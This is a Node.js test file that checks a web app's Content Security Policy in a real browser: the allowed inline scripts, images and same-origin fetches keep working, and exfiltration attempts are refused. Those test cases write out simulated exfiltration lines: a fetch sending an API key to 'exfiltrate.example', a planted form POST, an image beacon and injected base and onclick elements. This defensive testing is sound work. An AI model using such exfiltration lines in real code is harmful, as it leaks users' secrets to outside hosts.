#!/usr/bin/env node
/*
 * The content security policy does what scripts/csp.js says, and — the half
 * that matters more — does not do anything it did not promise.
 *
 *   node tests/verify-csp.js
 *
 * No target argument and no build. The page served below is synthetic, over a
 * real http origin on a loopback port, because a policy's whole behaviour
 * depends on having an origin: 'self' means nothing on about:blank and
 * nothing useful on file://.
 *
 * WHY THE PERMISSIVE CHECKS COME FIRST. This policy is being added to an app
 * that cannot be run here — there is no licensed source in this container, so
 * there is no build to open. The realistic failure is not that the policy is
 * too weak; it is that it is too strong and the owner's next launch is a blank
 * screen. So the first block proves the things the app relies on every single
 * frame still work under it: inline <script>, inline onclick handlers, inline
 * <style>, data: images, blob: images, same-origin fetch. If any of those were
 * blocked the app would be dead on arrival, and that is the check worth having
 * before any of the denials below.
 *
 * The denials are then asserted through securitypolicyviolation events rather
 * than by observing a failed request, which is the only way to tell "the
 * browser refused this" apart from "this container has no network". A fetch to
 * Gemini fails here either way; only the event says why, and the difference
 * between the two is the entire claim.
 */
'use strict';
const http = require('http');
const { blankComments } = require('./_source.js');
const { launch, engineName } = require('./_engine.js');
const { onDeath, watch } = require('./_deathnote.js');
const CSP = require('../scripts/csp.js');
const fs = require('fs');
const path = require('path');

let passed = 0, failed = 0;
const ok = (label, cond, detail = '') => {
  cond ? passed++ : failed++;
  console.log((cond ? '  PASS  ' : '  FAIL  ') + label + (detail ? '  → ' + detail : ''));
};
let section = '';
const head = t => { section = t; console.log('\n── ' + t + ' ──'); };

/* Declared out here, and the handler installed out here, because the tail of
   this file is `})().catch(…)` — a catch that HANDLES the rejection, so no
   unhandledRejection is ever emitted and a note installed inside the IIFE
   would never fire. The catch takes the note's own emitter instead, which
   also moves the exception off stderr: scripts/verify.js concatenates the two
   pipes in no guaranteed order. See tests/_deathnote.js. */
const errors = [], events = [];
const died = onDeath(() => ({ section, checks: passed + failed, errors,
                              events: events.length ? events.join(', ') : 'none' }));

/* ── the policy is the same string in all three places ───────────────────── */
head('one policy, not three copies of one');
{
  const worker = fs.readFileSync(path.join(__dirname, '..', 'src', 'worker', 'apex.js'), 'utf8');
  ok('the Worker ships exactly the policy scripts/csp.js defines',
     worker.includes(CSP.HEADER_POLICY),
     worker.includes(CSP.HEADER_POLICY) ? '' : 'the Worker and csp.js have drifted');
  /* frame-ancestors is ignored in a meta tag, so it must be in the header form
     and absent from the shell's — a policy that claims it in <meta> is telling
     the reader it is protected when it is not. */
  ok('the header form carries frame-ancestors', /frame-ancestors 'none'/.test(CSP.HEADER_POLICY));
  ok('and the <meta> form does not pretend to', !/frame-ancestors/.test(CSP.META));

  const buildPwa = fs.readFileSync(path.join(__dirname, '..', 'scripts', 'build-pwa.js'), 'utf8');
  ok('the shell is stamped with the meta policy', buildPwa.includes('CSP.META'));
  ok('and the build refuses to ship a Worker that has drifted',
     buildPwa.includes('CSP.HEADER_POLICY'));
}

/* ── nothing contacts a host the policy does not allow ───────────────────── */
head('the allowlist covers every host the shipped app can reach');
{
  /* Hosts that appear in the source but are removed before the build finishes.
     Each is named with the step that removes it, so this is a claim that can be
     checked rather than a list of things to ignore. */
  const REMOVED = {
    'api.groq.com':          'mistral — Groq and Anthropic leave',
    'api.anthropic.com':     'mistral — Groq and Anthropic leave',
    'api.mistral.ai':        'onetutor — the second tutor leaves',
    'fonts.googleapis.com':  'stage0 — fonts: drop Google Fonts links',
    'fonts.gstatic.com':     'stage0 — fonts: drop Google Fonts links',
  };
  const relPath = p => path.relative(path.join(__dirname, '..'), p).split(path.sep).join('/');
  const roots = ['scripts', 'src'];
  const files = [];
  const walk = d => fs.readdirSync(d, { withFileTypes: true }).forEach(f => {
    const p = path.join(d, f.name);
    if (f.isDirectory()) walk(p); else if (f.name.endsWith('.js')) files.push(p);
  });
  roots.forEach(r => walk(path.join(__dirname, '..', r)));
  /* AND THE SHELL. app/systole.html holds the app logic between the src/
     slots, and app/css/*.css is every stylesheet the app has. With the patch
     chain gone both are plain source, so a host either one names is a host
     the shipped app reaches, and neither was read here: a host added to the
     shell was checked by nothing. */
  const appDir = path.join(__dirname, '..', 'app');
  const SHELL_FILES = [path.join(appDir, 'systole.html'),
    ...fs.readdirSync(path.join(appDir, 'css')).filter(f => f.endsWith('.css')).sort().map(f => path.join(appDir, 'css', f))];
  files.push(...SHELL_FILES);

  // Literal anchor hrefs navigate when clicked; connect-src governs fetch,
  // not navigation. Mask only anchor destinations, preserving image/src URLs
  // and direct fetches even when they use the same host as a source link.
  const resourceHosts = text => {
    const resources = blankComments(text).replace(/(<a\b[^<>]*?\bhref\s*=\s*(["']))https:\/\/[^"'<>\s]*\2/gi, (_, head, quote) => head + quote);
    return new Set([...resources.matchAll(/https:\/\/([a-z0-9.-]+)/gi)].map(m => m[1]));
  };
  const sourceLink = '<a href="https://example.org/guideline">Source</a>';
  ok('source hyperlinks are navigation while same-host fetches and images remain audited',
     resourceHosts(sourceLink).size === 0 &&
     resourceHosts(sourceLink + ' fetch("https://example.org/api")').has('example.org') &&
     resourceHosts(sourceLink + ' <img src="https://example.org/image.jpg">').has('example.org') &&
     resourceHosts('<a style="background:url(https://example.org/image.jpg)" href="https://example.org/guideline">').has('example.org'));
  const hosts = new Set();
  for (const f of files) {
    for (const host of resourceHosts(fs.readFileSync(f, 'utf8'))) hosts.add(host);
  }
  const allowed = new Set(CSP.CONNECT.filter(s => s.startsWith('https://'))
                                     .map(s => s.replace('https://', '')));
  const unaccounted = [...hosts].filter(h => !allowed.has(h) && !(h in REMOVED));
  ok('every resource https host is either allowed or removed by a named step',
     unaccounted.length === 0, unaccounted.join(', ') || 'none');
  ok('and the allowlist is not empty', allowed.size > 0, [...allowed].join(', '));
  /* The resource-host check audits connections, and img-src is narrower
     than connect-src: it allows no other host at all. So a picture fetched
     from the one host connect-src allows passes the check above and is
     refused by the browser at runtime, on the owner's device, with no test
     saying so. The places a page fetches a picture from are read here, in
     the shell and its stylesheets, blanked: a url() in CSS, and a src,
     srcset or poster in markup or a .src = in script. A <script src> from
     another host would be reported too, and would be refused as well.
     A srcset (or a preload's imagesrcset) is a list, and the browser may
     pick any candidate in it, a later one on a high-density iPad, so every
     candidate is read. This read only the first (found by review, #240).
     A URL with no scheme, //host/…, takes the page's, which is https in
     production, so it is judged as https://host/…; read only with an
     explicit scheme, one in a srcset passed (found by review, #246). */
  const imgHosts = new Set(CSP.IMG.filter(s => s.startsWith('https://')).map(s => s.slice('https://'.length)));
  const refused = url => {
    const m = url.match(/^(https?:)?\/\/([a-z0-9.-]+)/i);
    return !!m && ((m[1] || '').toLowerCase() === 'http:' || !imgHosts.has(m[2].toLowerCase()));
  };
  const IMG_AT = /(?:url\(\s*["']?|\b(?:src|poster)\s*=\s*["'`]?)((?:https?:)?\/\/[a-z0-9.-]+)/gi;
  const URL_COLON_AT = /\burl\s*:((?:https?:)?\/\/[a-z0-9.-]+)/gi;
  const SRCSET = /\b(?:image)?srcset\s*=\s*(?:"([^"]*)"|'([^']*)'|`([^`]*)`|([^\s>]+))/gi;
  const pictureViolations = source => {
    const text = blankComments(source), found = new Map();
    for (const m of text.matchAll(IMG_AT)) if (refused(m[1])) found.set(m.index, m[0]);
    /* CSS has no // comments, but the blanker reads the // of an unquoted
       url(//host/…) as one and blanks the rest of the line, and the shell
       writes its url()s unquoted. A // straight after a colon is not a
       comment to it (a URL's scheme), so that url( is written url: in its
       place, the same length, and the text is blanked and read again. A //
       comment that mentions such a url() still starts before it, and goes. */
    const kept = blankComments(source.replace(/\burl\((\s*)(?=\/\/)/gi, (m, ws) => 'url' + ws + ':'));
    for (const m of kept.matchAll(URL_COLON_AT))
      if (!found.has(m.index) && refused(m[1])) found.set(m.index, source.slice(m.index, m.index + m[0].length));
    for (const m of text.matchAll(SRCSET))
      for (const candidate of (m[1] ?? m[2] ?? m[3] ?? m[4]).split(','))
        if (refused(candidate.trim())) found.set(`srcset ${m.index} ${candidate.trim()}`, `srcset … ${candidate.trim()}`);
    return [...found.values()];
  };
  ok('later srcset and preload candidates are checked; local candidates remain allowed',
     pictureViolations('<img srcset="/local.png 1x, https://unlisted.invalid/image.png 2x">').length === 1 &&
     pictureViolations("<link imagesrcset='/local.png 1x, http://unlisted.invalid/image.png 2x'>").length === 1 &&
     pictureViolations('<img srcset="/local.png 1x, /large.png 2x">').length === 0);
  {
    /* Each place a picture is read from, with the host given scheme-relative;
       and what stays allowed: a path that merely starts with one slash, and a
       // comment in a script that only mentions such a URL. */
    const cases = [
      ['a later srcset candidate', '<img srcset="/local.png 1x, //unlisted.invalid/image.png 2x">', 1],
      ['a src', '<img src="//unlisted.invalid/image.png">', 1],
      ['a poster', '<video poster="//unlisted.invalid/still.png"></video>', 1],
      ['a quoted url() in a <style>', '<style>.x { background: url("//unlisted.invalid/image.png") }</style>', 1],
      ['an unquoted url() in a <style>', '<style>.x { background: url(//unlisted.invalid/image.png) }</style>', 1],
      ['an unquoted url() in a style attribute', '<div style="background: url(//unlisted.invalid/image.png)"></div>', 1],
      ['an unquoted url() in a stylesheet', '.x { background: url(//unlisted.invalid/image.png) }', 1],
      ['a script .src =', "<script>img.src = '//unlisted.invalid/image.png';</script>", 1],
      ['a local path', '<img src="/local.png" srcset="/large.png 2x">', 0],
      ['a script comment', '<script>// was url(//unlisted.invalid/image.png)\nlet x = 1;</script>', 0],
    ];
    const missed = cases.filter(([, html, n]) => pictureViolations(html).length !== n).map(([what]) => what);
    ok('a scheme-relative //host picture is judged as the page’s https: a srcset candidate, src, poster, url() or .src on another host is refused',
       missed.length === 0, missed.join(', ') || `${cases.length} cases`);
  }
  const offHost = SHELL_FILES.flatMap(f => pictureViolations(fs.readFileSync(f, 'utf8'))
    .map(violation => `${relPath(f)}: ${violation}`));
  ok('no picture in the shell or a stylesheet comes from a host img-src refuses',
     offHost.length === 0 && SHELL_FILES.length > 1, offHost.join('; ') || `${SHELL_FILES.length} files read`);
  /* The other direction: a host allowed by the policy but contacted by nothing
     is a permission granted for no reason. */
  const unused = [...allowed].filter(h => !hosts.has(h));
  ok('nothing is allowed that the app never contacts', unused.length === 0, unused.join(', ') || 'none');
}

/* ── and now the browser, on a real origin ───────────────────────────────── */
const PAGE = `<!doctype html><html><head>${CSP.META}
<style>.inline-style-worked{color:rgb(1,2,3)}</style></head><body>
<p id="probe" class="inline-style-worked">probe</p>
<button id="btn" onclick="window.__inlineHandler=true">go</button>
<script>
  window.__inlineScript = true;
  window.__violations = [];
  document.addEventListener('securitypolicyviolation', function(e){
    window.__violations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI).slice(0,60) });
  });
  window.__imgResult = function(src){ return new Promise(function(res){
    var i = new Image(); i.onload = function(){ res('loaded'); }; i.onerror = function(){ res('failed'); };
    i.src = src;
  }); };
</script></body></html>`;

/* The page E2 works towards (docs/ROADMAP.md, E2; scripts/csp.js, scriptPolicy): no inline handler, one delegated
   listener reading data-action, and the policy with a script-src of 'self' and the hash of the one inline script it
   keeps, its boot. The hash is worked out here from the script's text, as the build that ships it will have to. */
const BOOT = `
  window.__boot = true; window.__actions = []; window.__violations = [];
  document.addEventListener('securitypolicyviolation', function(e){
    window.__violations.push({ directive: e.effectiveDirective, violated: e.violatedDirective, sample: String(e.sample || '').slice(0, 40) });
  });
  document.addEventListener('click', function(e){
    var t = e.target.closest('[data-action]'); if (t) window.__actions.push(t.getAttribute('data-action'));
  });
`;
const BOOT_HASH = require('crypto').createHash('sha256').update(BOOT, 'utf8').digest('base64');
const E2_POLICY = CSP.scriptPolicy([BOOT_HASH]);
const E2_PAGE = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${E2_POLICY}">
<script>${BOOT}</script></head><body>
<button id="act" data-action="open-figure">delegated</button>
<button id="old" onclick="window.__inlineHandler=true">written in</button>
<div id="slot"></div>
<script src="/e2.js"></script>
</body></html>`;

const GIF = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');

(async () => {
  /* Another origin that serves a real pixel and records every request, so an
     image the policy lets through is seen ARRIVING, not inferred from a load
     event: the review's repro, where fetch was refused and new Image() still
     delivered its query string to another port. */
  const offHits = [];
  const off = http.createServer((req, res) => {
    offHits.push(req.url);
    res.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' });
    res.end(GIF);
  });
  await new Promise(r => off.listen(0, '127.0.0.1', r));
  const offOrigin = `http://127.0.0.1:${off.address().port}`;
  const server = http.createServer((req, res) => {
    if (req.url === '/pixel.gif') {
      res.writeHead(200, { 'content-type': 'image/gif' });
      return res.end(GIF);
    }
    if (req.url === '/e2') {
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      return res.end(E2_PAGE);
    }
    if (req.url === '/e2.js') {
      res.writeHead(200, { 'content-type': 'text/javascript' });
      return res.end('window.__selfScript = true;');
    }
    if (req.url === '/allowed.json') {
      res.writeHead(200, { 'content-type': 'application/json' });
      return res.end('{"ok":true}');
    }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(PAGE);
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const origin = `http://127.0.0.1:${server.address().port}`;

  const browser = await launch();
  const page = watch(await (await browser.newContext()).newPage(), events);
  page.on('pageerror', e => errors.push(e.message));
  await page.goto(origin + '/', { waitUntil: 'load' });
  console.log(`  engine: ${engineName()}   origin: ${origin}`);

  head('the app still works — everything it does every frame');
  ok('an inline <script> still runs', await page.evaluate(() => window.__inlineScript === true));
  await page.click('#btn');
  ok('an inline onclick handler still fires — all 119 of them depend on this',
     await page.evaluate(() => window.__inlineHandler === true));
  ok('an inline <style> still applies',
     await page.evaluate(() => getComputedStyle(document.getElementById('probe')).color) === 'rgb(1, 2, 3)');
  /* Every figure in the single-file build is a data: URI, and the split build
     decodes fetched figures into data: URIs for the vision call. */
  const dataPix = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
  ok('a data: image still loads', await page.evaluate(s => window.__imgResult(s), dataPix) === 'loaded');
  ok('a same-origin image still loads — content/figures and the icons',
     await page.evaluate(() => window.__imgResult('/pixel.gif')) === 'loaded');
  /* Made from bytes the page holds, as bankstore.js makes them; fetching the
     data: URI would be refused by connect-src, which has no data:. */
  ok('a blob: image still loads — the code-only deploy\'s figures', await page.evaluate(s => {
    const bytes = Uint8Array.from(atob(s.split(',')[1]), c => c.charCodeAt(0));
    return window.__imgResult(URL.createObjectURL(new Blob([bytes], { type: 'image/gif' })));
  }, dataPix) === 'loaded');
  const sameOrigin = await page.evaluate(async () => {
    try { const r = await fetch('/allowed.json'); return (await r.json()).ok === true ? 'ok' : 'bad'; }
    catch (e) { return 'threw: ' + e.message; }
  });
  ok("a same-origin fetch is allowed by connect-src 'self'", sameOrigin === 'ok', sameOrigin);
  ok('and none of that raised a single violation',
     (await page.evaluate(() => window.__violations.length)) === 0,
     JSON.stringify(await page.evaluate(() => window.__violations)));

  head('and the things the app never does are now refused');
  /* The report of a blocked action is an event the browser queues, not a return
     value, and a blocked form submission is reported from the browser process.
     A fixed 150 ms read the list too soon on the owner's laptop 50 minutes into a
     full run on the real build: "no violation" for a form that was blocked.
     So a check that expects a block passes the directive it expects, and this
     waits up to 5 s for that report; without one, it is still "no violation".
     A check that expects NO block (Gemini) keeps the short window: absence has no
     event to wait for. */
  const violated = async (fn, arg, want) => {
    const before = await page.evaluate(() => window.__violations.length);
    await page.evaluate(fn, arg).catch(() => {});
    if (want) {
      await page.waitForFunction(([n, d]) => window.__violations.slice(n).some(v => v.directive === d),
        [before, want], { timeout: 5000 }).catch(() => {});
    } else {
      await page.waitForTimeout(150);
    }
    return page.evaluate(n => window.__violations.slice(n), before);
  };

  const conn = await violated(() => fetch('https://exfiltrate.example/steal?k=' +
    encodeURIComponent('the fellow\'s api key')).catch(() => {}), undefined, 'connect-src');
  ok('a fetch to an unlisted host is blocked by connect-src',
     conn.some(v => v.directive === 'connect-src'), JSON.stringify(conn) || 'no violation');

  /* The distinction the whole exercise turns on. This request also fails in
     this container — there is no route to Google — so a failed fetch proves
     nothing. The absence of a connect-src violation is what proves the policy
     permits it. */
  const gem = await violated(() =>
    fetch('https://generativelanguage.googleapis.com/v1beta/models').catch(() => {}));
  ok('but Gemini is permitted — it fails on the network, not on the policy',
     !gem.some(v => v.directive === 'connect-src'), JSON.stringify(gem) || 'no violation');

  /* The image route: what the fetch above was refused, an image used to
     deliver. The off-origin server's own log is the instrument — a blocked
     image never reaches it; a load event alone could not tell a refusal
     from a server that never answered. */
  const before = offHits.length;
  const img = await violated(u => window.__imgResult(u + '/pixel.gif?k=' + encodeURIComponent('the fellow\'s api key')),
    offOrigin, 'img-src');
  await page.waitForTimeout(300);
  ok('an image from another host is blocked by img-src', img.some(v => v.directive === 'img-src'), JSON.stringify(img) || 'no violation');
  ok('and the other host never receives the request', offHits.length === before, offHits.slice(before).join(', ') || 'none');

  const base = await violated(() => {
    const b = document.createElement('base');
    b.href = 'https://exfiltrate.example/';
    document.head.appendChild(b);
  }, undefined, 'base-uri');
  ok("an injected <base> is refused — it would repoint app.js and all 408 figures",
     base.some(v => v.directive === 'base-uri'), JSON.stringify(base) || 'no violation');

  const obj = await violated(() => {
    const o = document.createElement('object');
    o.data = 'https://exfiltrate.example/x.swf';
    document.body.appendChild(o);
  }, undefined, 'object-src');
  ok('an <object> is refused', obj.some(v => v.directive === 'object-src'),
     JSON.stringify(obj) || 'no violation');

  const form = await violated(() => {
    const f = document.createElement('form');
    f.method = 'POST'; f.action = 'https://exfiltrate.example/collect';
    document.body.appendChild(f); f.submit();
  }, undefined, 'form-action');
  ok('a planted form cannot submit — pure exfiltration, and the app has none',
     form.some(v => v.directive === 'form-action'), JSON.stringify(form) || 'no violation');

  /* ── E2: what a script-src would refuse, and what it would keep ───────── */
  head('E2: today an injected handler runs; with a script-src it is refused');
  /* Today's policy has no script-src (see scripts/csp.js), so markup an attacker gets into the page carries a handler
     that runs. Said here so that it is measured, not only written: the day it stops being true, this check fails and
     the header of scripts/csp.js has to be read again. */
  /* A page of its own: the planted form above leaves the first page's navigation pending in Chromium. */
  const today = watch(await (await browser.newContext()).newPage(), events);
  today.on('pageerror', e => errors.push('today: ' + e.message));
  await today.goto(origin + '/', { waitUntil: 'load' });
  await today.evaluate(() => {
    const d = document.createElement('div');
    d.innerHTML = '<button id="planted" onclick="window.__planted=true">x</button>';
    document.body.appendChild(d);
  });
  await today.click('#planted');
  ok('under the policy shipped today, an injected onclick runs: it has no script-src to refuse it',
     await today.evaluate(() => window.__planted === true));

  const e2 = watch(await (await browser.newContext()).newPage(), events);
  e2.on('pageerror', e => errors.push('e2: ' + e.message));
  await e2.goto(origin + '/e2', { waitUntil: 'load' });
  const v2 = () => e2.evaluate(() => (window.__violations || []).slice());
  /* A refused handler is reported by an event the browser queues; wait for the report a check expects, as above. */
  const refusedBy = async (n, re) => {
    await e2.waitForFunction(([k, src]) => (window.__violations || []).slice(k).some(v => new RegExp(src).test(v.directive)),
      [n, re.source], { timeout: 5000 }).catch(() => {});
    return (await v2()).slice(n);
  };
  ok('the policy E2 ships has a script-src of \'self\' and the boot\'s hash, and is today\'s policy otherwise',
     E2_POLICY === CSP.POLICY + "; script-src 'self' 'sha256-" + BOOT_HASH + "'" && !/script-src/.test(CSP.POLICY), E2_POLICY.slice(-80));
  ok('under it, the boot script runs, by its hash, and a script file from this origin runs',
     await e2.evaluate(() => window.__boot === true && window.__selfScript === true));
  await e2.click('#act');
  ok('a button with data-action is heard by the one delegated listener',
     JSON.stringify(await e2.evaluate(() => window.__actions || null)) === '["open-figure"]', JSON.stringify(await e2.evaluate(() => window.__actions || null)));
  ok('and loading the page raised no violation', (await v2()).length === 0, JSON.stringify(await v2()));
  let n = (await v2()).length;
  await e2.click('#old');
  const old = await refusedBy(n, /^script-src/);
  ok('an onclick written into the page is refused, and the report names script-src',
     !(await e2.evaluate(() => window.__inlineHandler)) && old.some(v => /^script-src/.test(v.directive)), JSON.stringify(old) || 'no violation');
  n = (await v2()).length;
  await e2.evaluate(() => { document.getElementById('slot').innerHTML = '<button id="planted" onclick="window.__planted=true">x</button>'; });
  await e2.click('#planted');
  const planted = await refusedBy(n, /^script-src/);
  ok('an onclick injected into the page is refused: the click lands, the handler does not run',
     !(await e2.evaluate(() => window.__planted)) && planted.some(v => /^script-src/.test(v.directive)), JSON.stringify(planted) || 'no violation');
  n = (await v2()).length;
  await e2.evaluate(() => { const sc = document.createElement('script'); sc.textContent = 'window.__plantedScript = true;'; document.body.appendChild(sc); });
  const script = await refusedBy(n, /^script-src/);
  ok('and an injected inline script without the hash is refused',
     !(await e2.evaluate(() => window.__plantedScript)) && script.some(v => /^script-src/.test(v.directive)), JSON.stringify(script) || 'no violation');

  await browser.close();
  server.close();
  off.close();
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
})().catch(died);
